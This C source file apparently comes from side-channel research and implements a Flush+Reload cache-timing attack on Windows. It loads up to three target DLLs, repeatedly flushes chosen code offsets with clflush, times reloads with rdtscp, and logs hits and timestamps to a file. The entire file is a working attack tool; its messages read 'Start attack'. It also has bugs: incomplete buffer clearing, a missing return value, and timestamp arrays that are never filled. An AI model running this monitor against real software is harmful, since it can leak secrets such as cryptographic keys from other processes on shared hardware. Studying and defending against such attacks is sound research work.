//Module performs Flush&Reload attack for Windows
//Uses probe function memaccesstime taken from Mastik project
//https://github.com/0xADE1A1DE/Mastik/
//compiles using Codeblocks' gcc.exe

//#include <pthread.h>
//#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <memoryapi.h>

#include <sys/time.h>
#include <getopt.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <ctype.h>
#include <signal.h>
#include <windows.h>



#define THRESHOLD 172


#define DEFAULT_PROBE_TIME 50000UL
#define OUTPUT_BUFFER_LENGTH 1000
#define PROBE_COUNT 80
#define DEFAULT_FLUSH_INTERVAL 2
#define DEFAULT_PROGRAM_TIME 300 //About five minutes
#define DEFAULT_DELTA THRESHOLD
#define FILENAME_SIZE 1024

static volatile int stop_run = 0;


unsigned long hit1 = 0, hit2 = 0, hit3 = 0;
unsigned long long output_buffer1[OUTPUT_BUFFER_LENGTH] = {0};
unsigned long long output_buffer2[OUTPUT_BUFFER_LENGTH] = {0};
unsigned long long output_buffer3[OUTPUT_BUFFER_LENGTH] = {0};
uint64_t output_delta1[OUTPUT_BUFFER_LENGTH] = {0};
uint64_t output_delta2[OUTPUT_BUFFER_LENGTH] = {0};
uint64_t output_delta3[OUTPUT_BUFFER_LENGTH] = {0};
time_t printst1[OUTPUT_BUFFER_LENGTH] = {0};
time_t printst2[OUTPUT_BUFFER_LENGTH] = {0};
time_t printst3[OUTPUT_BUFFER_LENGTH] = {0};
FILE * outputfile;
size_t delta_list[100000] = {0};




// flushes address from cache (with fencing)
__attribute__((always_inline))
inline uint64_t clflush_addr(const void *adrs) {

  asm volatile (
    "  mfence             \n"
    "  clflush 0(%0)      \n"
    :
    : "c" (adrs));
  return 0;
}

// wrapper for asm rdtscp
static inline uint32_t rdtscp() {
  uint32_t rv;
  asm volatile ("rdtscp": "=a" (rv) :: "edx", "ecx");
  return rv;
}

// wrapper for asm rdtscp64
static inline uint64_t rdtscp64() {
  uint32_t low, high;
  asm volatile ("rdtscp": "=a" (low), "=d" (high) :: "ecx");
  return (((uint64_t)high) << 32) | low;
}


/******************************************************************
* Function memaccesstime (Based on Mastik)
* 
* probe address and return access time in cycles
* 
* https://github.com/0xADE1A1DE/Mastik/
********************************************************************/
static inline uint32_t memaccesstime(const void *v) {
  uint32_t rv;
  asm volatile (
      "mfence\n"
      "lfence\n"
      "rdtscp\n"
      "mov %%eax, %%esi\n"
      "mov (%1), %%eax\n"
      "rdtscp\n"
      "sub %%esi, %%eax\n"
      : "=&a" (rv): "r" (v): "ecx", "edx", "esi");
  return rv;
}

// flushes address from cache
static inline void clflush(const void *v) {
  asm volatile ("clflush 0(%0)": : "r" (v):);
}




/********************************************************************
 * gettime
 * uses rdtsc from eax and edx to get the current cycle count
 * 
 * return value in t
 * 
**********************************************************************/
__attribute__((always_inline))
inline uint64_t gettime() {
    volatile uint64_t t;
    asm __volatile__(
        "rdtsc\r\n"
        "shlq $32, %%rdx\r\n"
        "orq %%rdx, %%rax\r\n"
        : "=a" (t)
        :
        : "%rdx"
    );
    return t;
}


/***********************************************
* Function: flush_and_reload3_addr
* Performs Flush & Reload attack for 3 addresses
* If there is a hit for any of the addresses, 
* updates the buffer
*
***********************************************************/

time_t flush_and_reload3_addr(const void *addr, const void *addr2, const void *addr3, uint64_t time1, uint64_t delta_thresh) {
    
	_Bool hasHit1 = 0;
	_Bool hasHit2 = 0;
	_Bool hasHit3 = 0;
    time_t sometime = 0;
    
    size_t delta = memaccesstime(addr);
	size_t delta2 = memaccesstime(addr2);
	size_t delta3  = memaccesstime(addr3);
    clflush(addr);
    clflush(addr2);
    clflush(addr3);
	
      
    if (delta < delta_thresh) {
           
        hasHit1 = 1;
		hit1++;
			
    }
	if (delta2 < delta_thresh) {
            
		hasHit2 = 1;
		
		hit2++;
    }
	if (delta3 < delta_thresh) {
            
		hasHit3 = 1;
		
		hit3++;
    }
      
    if (hasHit1 || hasHit2|| hasHit3){
       
        time1 = gettime();
        if (hasHit1){
            if (hit1 < OUTPUT_BUFFER_LENGTH){

    		    output_buffer1[hit1] = time1;
                output_delta1[hit1] = delta;
            
		    }
        }
        if(hasHit2)
        {
            if (hit2 < OUTPUT_BUFFER_LENGTH){
	    		output_buffer2[hit2] = time1;
                output_delta2[hit2] = delta2;
            }
        }
        if(hasHit3)
        {
            if (hit3 < OUTPUT_BUFFER_LENGTH){
	    		output_buffer3[hit3] = time1;
            
                output_delta3[hit3] = delta3;
            }
        }
    }
    
	return sometime;
}

/***********************************************
* Function: flush_and_reload2_addr
* Performs Flush & Reload attack for 2 addresses
* If there is a hit for any of the addresses, 
* updates the buffer
*
***********************************************************/

time_t flush_and_reload2_addr(const void *addr, const void *addr2, uint64_t time1, uint64_t delta_thresh) {
    
	_Bool hasHit1 = 0;
	_Bool hasHit2 = 0;
	
    time_t sometime = 0;
    
    size_t delta = memaccesstime(addr);
    size_t delta2 = memaccesstime(addr2);
	clflush(addr);
	clflush(addr2);

	
      
    if (delta < delta_thresh) {
           
        hasHit1 = 1;
		hit1++;
			
    }
	if (delta2 < delta_thresh) {
            
		hasHit2 = 1;
		
		hit2++;
    }
	
      
    if (hasHit1 || hasHit2){
        
        time1 = gettime();
        if (hasHit1){
            if (hit1 < OUTPUT_BUFFER_LENGTH){	      
    		    output_buffer1[hit1] = time1;
                output_delta1[hit1] = delta;
            
		    }
        }
        if(hasHit2)
        {
            if (hit2 < OUTPUT_BUFFER_LENGTH){
	    		output_buffer2[hit2] = time1;            
                output_delta2[hit2] = delta2;
            }
        }
        
    }
    
	return sometime;
}

/***********************************************
* Function: flush_and_reloadsingle_addr
* Performs Flush & Reload attack for 1 address
* If there is a hit for the addresses, 
* updates the buffer
*
***********************************************************/

time_t flush_and_reloadsingle_addr(const void *addr, uint64_t time1, uint64_t delta_thresh) {
    
	_Bool hasHit1 = 0;
    time_t sometime = 0;
    
    size_t delta = memaccesstime(addr);
	clflush(addr);

      
    if (delta < delta_thresh) {
           
        hasHit1 = 1;
		hit1++;
			
    }
	
      
    if (hasHit1){
        time1 = gettime();
        if (hasHit1){
            if (hit1 < OUTPUT_BUFFER_LENGTH){
    		    output_buffer1[hit1] = time1;
                output_delta1[hit1] = delta;
            
		    }
        }
        
    }
    
	return sometime;
}



/*****************************************************************************************************************
     * 
     * print_buffers
     * flushes the cache hit information for both addresses to file.  
     * Is called every flush interval - default value 2 seconds.
     * outputfile is a global variable
     * 
     * *************************************************************************************************************/
void print_buffers(){
	int i = 0;
	for (i=1; i< hit3;i++)
	{
        fprintf(outputfile, "3 #%llu #%llu #%llu\n", output_buffer3[i], printst3[i], output_delta3[i]);
	}

	for (i=1; i< hit2;i++)
	{
        fprintf(outputfile, "2 #%llu #%llu #%llu\n", output_buffer2[i], printst2[i], output_delta2[i]);
	}
	for (i=1; i< hit1;i++)
	{
				
		fprintf(outputfile, "1 #%llu #%llu #%llu\n", output_buffer1[i], printst1[i], output_delta1[i]);
	}
	fflush(outputfile);
	
	memset(output_buffer1, 0, OUTPUT_BUFFER_LENGTH);
    memset(output_buffer2, 0, OUTPUT_BUFFER_LENGTH);
    memset(output_buffer3, 0, OUTPUT_BUFFER_LENGTH);
    memset(output_delta1, 0, OUTPUT_BUFFER_LENGTH);
    memset(output_delta2, 0, OUTPUT_BUFFER_LENGTH);
    memset(output_delta3, 0, OUTPUT_BUFFER_LENGTH);
	hit1 =0;
	hit2 = 0;
    hit3 =0;
}

/*****************************************************************************************************************
 * output_initial_values
 * prints the initial values of the important parameters including the data being monitored.
 * This allows us to verify that the address monitored is in fact the expected data
 * 
 * 
 ***************************************************************************************************************/
void output_initial_values(uint64_t program_length, uint64_t flush_interval, const unsigned char* data, const unsigned char* data2, const unsigned char* data3, unsigned int offset, unsigned int offset2, unsigned int offset3, unsigned int addrcount){
    int i =0 ;
    printf("Program running with initial values (times are approximate):\n");
    printf("Program length - %lu seconds\n", program_length);
    printf("Flush interval - %lu seconds\n", flush_interval);

	if (addrcount >= 1 && data){
		printf("Memptr - %p\r\n", data);
        printf("address 1 with offset - %p\r\n", (data+offset));
        printf("start printing mem dump\r\n");
        for (int i = 0; i < 50; i++)
        {
            printf("%x ", *(data+offset+i));
        }
	}
	
	if(addrcount >= 2 && data2 ){
		printf("\r\n");
		printf("Memptr - %p\r\n", data2);
        printf("address 2 with offset - %p\r\n", (data2+offset2));
        printf("start printing mem dump\r\n");
        for (int i = 0; i < 50; i++)
        {
            printf("%x ", *(data2+offset2+i));
        }
        
	}
    if(addrcount >= 3 && data3)
    {
        printf("\r\n");
		printf("Memptr - %p\r\n", data3);
        printf("address 3 with offset - %p\r\n", (data3+offset3));
        printf("start printing mem dump\r\n");
        for (int i = 0; i < 50; i++)
        {
            printf("%x ", *(data3+offset3+i));
        }
        printf("\r\n");
    }
    if (!data || (addrcount >= 2 && !data2) || (addrcount >= 3 && !data3))
    {
        printf("Failed no data\r\n");
    }

}


//handles the different arguments, gets the target addresses.
int handle_arguments(int argc, char **argv, const unsigned char ** ptarget_file, const unsigned char ** ptarget_file2, const unsigned char ** ptarget_file3, unsigned int * poffset, unsigned int * poffset2, unsigned int * poffset3, uint64_t * pflush_interval, uint64_t *pprogram_length, uint64_t *pprobe_time, uint64_t *pdelta, char target_filename1[FILENAME_SIZE], char target_filename2[FILENAME_SIZE], char target_filename3[FILENAME_SIZE], char outputfilename[FILENAME_SIZE], unsigned int * paddrcount){
    int c;
    int digit_optind = 0;
    static struct option long_options[] = {
            {"addrcount",    required_argument, 0,  'a' },
            {"target1",    required_argument, 0,  'b' },
            {"target2",    required_argument, 0,  'B' },
            {"target3",    required_argument, 0,  't' },
            {"offset1",    required_argument, 0,  'o' },
            {"offset2",    required_argument, 0,  'O' },
            {"offset3",    required_argument, 0,  'T' },
            {"output",    required_argument, 0,  'u' },
            {"probe_time",    required_argument, 0,  'p' },
            {"flush_interval",    required_argument, 0,  'f' },
            {"program_length",    required_argument, 0,  'l' },
            {"delta",      required_argument, 0, 'd'},
            {0,         0,                 0,  0 }
    };

    while (1) {
        int this_option_optind = optind ? optind : 1;
        int option_index = 0;
        

        c = getopt_long(argc, argv, "habBoOupfltTd",
                        long_options, &option_index);
        if (c == -1)
           break;

        switch (c) {
           case 0:
               printf("option %s", long_options[option_index].name);
               if (optarg)
                   printf(" with arg %s", optarg);
               printf("\n");
               break;

        

            case 'h':
                printf("usage: flush_reload_monitor.exe [arguments]\n");
                printf("--addrcount [addrcount]\n");
                printf("--target1 [target1 path]\n --target2 [target2 path]\n --target3 [target3 path]\n");
                printf("--offset1 [offset1]\n --offset2 [offset2]\n --offset3 [offset3]\n");
                printf("Additional optional arguments:\n");
                printf("--output [output_file_path]\n");
                printf("--probe_time [probe_time]\n");
                printf("--flush_interval [flush_interval]\n");
                printf("--program_length [program_length]\n");
                printf("--delta [delta threshold]\n");
                break;

            case 'a':
                if (!sscanf_s(optarg, "%x", paddrcount)){
                    printf("Bad addr count %s", optarg);
                    return 2;
                }
                break;
            case 'b':
                  
                *ptarget_file = (const unsigned char*) LoadLibrary(optarg);
                if (0== *ptarget_file){ 
                   printf("Bad target filename %s", optarg);
                   return 1;
                } 
                else{
                   printf("Monitoring target1 %s", optarg);
                   if(memcpy_s(target_filename1,FILENAME_SIZE -1, optarg, FILENAME_SIZE-1))
                     return 1;
                }
                  
                break;

            case 'B':
                
                *ptarget_file2 = (const unsigned char*) LoadLibrary(optarg);
                if (0== *ptarget_file2){
                    printf("Bad target filename %s", optarg);
                    return 1;
                } 
                   
                printf("Monitoring target2 %s", optarg);
                if (memcpy_s(target_filename2,FILENAME_SIZE-1, optarg, FILENAME_SIZE-1))
                     return 1;
                               
               break;
            
            case 't':
                
                *ptarget_file3 = (const unsigned char*) LoadLibrary(optarg);
                if (0== *ptarget_file3){
                    printf("Bad target filename %s", optarg);
                    return 1;
                } 
                   
                printf("Monitoring target3 %s", optarg);
                if (memcpy_s(target_filename3,FILENAME_SIZE-1, optarg, FILENAME_SIZE-1))
                     return 1;
                               
               break;

            case 'o':
                if (!sscanf_s(optarg, "%x", poffset)){
                    printf("Bad offset %s", optarg);
                    return 2;
                }
                  
                printf("Monitoring offset1 %s", optarg);
                break;

            case 'O':
                if (!sscanf_s(optarg, "%x", poffset2)){
                    printf("Bad offset %s", optarg);
                    return 2;
                }
                  
                printf("Monitoring offset2 %s", optarg);

                                   
                break;
                
            case 'T':
                if (!sscanf_s(optarg, "%x", poffset3)){
                    printf("Bad offset %s", optarg);
                    return 2;
                }
                  
                printf("Monitoring offset3 %s", optarg);

                                   
                break;
                
            case 'p':
                if (!sscanf_s(optarg, "%lx", pprobe_time)){
                    printf("Bad probe time %s", optarg);
                    return 2;
                }
                  
                printf("Probe time %s", optarg);
                break;

            case 'f':
                if (!sscanf_s(optarg, "%lx", pflush_interval)){
                    printf("Bad flush interval %s", optarg);
                    return 2;
                }
                  
                printf("Flush interval %s", optarg);
                break;
            case 'l':
                if (!sscanf_s(optarg, "%lx", pprogram_length)){
                    printf("Bad program length %s", optarg);
                    return 2;
                }
                  
                printf("Program length %s", optarg);
                break;
            case 'd':
                if (!sscanf_s(optarg, "%lx", pdelta)){
                    printf("Bad delta threshold %s", optarg);
                    return 2;
                }
                  
                printf("Delta threshold %s", optarg);
                break;


            case 'u':
                outputfile = fopen(optarg,"w+");
                if (NULL == outputfile){
                    printf("Bad outputfile\n");
                    return 1;
                }
                if (memcpy_s(outputfilename,FILENAME_SIZE-1, optarg, FILENAME_SIZE-1))
                    return 1;
                    
                    
                break;


            default:
                printf("?? getopt returned character code 0%o ??\n", c);
            }
        }

        if (optind < argc) {
            printf("non-option ARGV-elements: ");
            while (optind < argc)
                printf("%s ", argv[optind++]);
            printf("\n");
        }


}


//Set Ctrl+c handler
void intHandler(int dummy){
	printf("Stopping\n");
 	stop_run = 1;
}


int main(int argc, char **argv) {
 
    const unsigned char * target_file, * target_file2, * target_file3;
    char target_filename1[FILENAME_SIZE],target_filename2[FILENAME_SIZE],target_filename3[FILENAME_SIZE];
    char outputfilename[FILENAME_SIZE] ; 
    uint64_t flush_interval =DEFAULT_FLUSH_INTERVAL, program_length=DEFAULT_PROGRAM_TIME, probe_time=DEFAULT_PROBE_TIME, delta_threshold= DEFAULT_DELTA;
	unsigned int offset = 0, offset2 = 0, offset3 = 0, addrcount = 0;
    time_t start_time, prev_time, cur_time;
   
    int handled =0 ;
    
    uint64_t old_time = 0, new_time=0;
	struct tm * timeinfo;
	unsigned int probe_counter = 0;
	//char* fPtr = (char*)target_func;
	struct timeval t0;
    time_t time_in_seconds = 0;
    double time_in_microsec = 0;
	
	
	if (argc < 4){
        return 1;
	}
	

    //handle arguments
    handled = handle_arguments(argc, argv, &target_file, &target_file2, &target_file3, &offset, &offset2, &offset3, &flush_interval, &program_length, &probe_time, &delta_threshold, target_filename1, target_filename2, target_filename3, outputfilename, &addrcount);
    
    signal(SIGINT, intHandler);
	
    output_initial_values(program_length, flush_interval, target_file, target_file2, target_file3, offset, offset2, offset3, addrcount);
    
    switch (addrcount){
        case 1:
            fprintf(outputfile, "Monitoring file1 %s at address %lx \n \n \n", target_filename1, offset);
            clflush_addr(target_file + offset);
            break;
        case 2:
            fprintf(outputfile, "Monitoring file1 %s at address %lx \n file2 %s at address %lx\n\n", target_filename1, offset, target_filename2, offset2);
            clflush_addr(target_file + offset);
            clflush_addr(target_file2 + offset2);
            break;
        case 3:
            fprintf(outputfile, "Monitoring file1 %s at address %lx \n file2 %s at address %lx\n file3 %s at address %lx\n", target_filename1, offset, target_filename2, offset2,target_filename3, offset3);
            clflush_addr(target_file + offset);
            clflush_addr(target_file2 + offset2);
            clflush_addr(target_file3 + offset3);
            break;
    }
    
	
	gettimeofday(&t0, 0);
	time_in_microsec =  t0.tv_usec/1000000.0;
	time_in_microsec += t0.tv_sec;

    old_time = gettime();
    time(&start_time);
    fprintf(outputfile, "Current time is %.6f and %llu cycles \n", time_in_microsec, old_time);
    prev_time = start_time;
	cur_time = start_time;
    new_time = old_time+probe_time; 
    printf("Start attack\r\n");

    
	fflush(outputfile);
	fflush(stdout);
	
	
    while (1) {
        //hold while waiting for probe time
		while (new_time <= old_time + probe_time){
            new_time = gettime();
        }

		old_time = new_time;
        switch (addrcount){
            case 1:
                flush_and_reloadsingle_addr(target_file + offset, new_time,delta_threshold);
                break;
            case 2:
                flush_and_reload2_addr(target_file + offset, target_file2 + offset2, new_time,delta_threshold);
                break;
            case 3:
                flush_and_reload3_addr(target_file + offset, target_file2 + offset2, target_file3 + offset3, new_time,delta_threshold);
                break;
        }
		probe_counter += 1; 
		if ((cur_time - program_length) >= (start_time) || stop_run)
		{
			print_buffers();
			printf("Ending\n");
            old_time = gettime();
			gettimeofday(&t0, 0);
            time_in_microsec =  t0.tv_usec/1000000.0;
            time_in_microsec += t0.tv_sec;
			
            fprintf(outputfile, "Current time is %.6f and %llu cycles \n", time_in_microsec, old_time);
			fflush(outputfile);
			return 0;
			
		}
			
		if (stop_run){
            print_buffers();
            printf("Ending\n");
            gettimeofday(&t0, 0);
            old_time = gettime();
            //time(&start_time);
            time_in_microsec =  t0.tv_usec/1000000.0;
            time_in_microsec += t0.tv_sec;
            fprintf(outputfile, "Current time is %.6f and %llu cycles \n", time_in_microsec, old_time);
            fflush(outputfile);
            return 0;
                
		}
		
		if (probe_counter >= PROBE_COUNT)
        {
            time(&cur_time); //change to rdtsc
            probe_counter = 0;
        }
		if (cur_time-flush_interval> prev_time){
			
            prev_time=cur_time;
			printf("flushinnnnng\n");
			
			fflush(outputfile);
			print_buffers();
			fflush(outputfile);
            
		}
		
		
	}

    return 0;
}
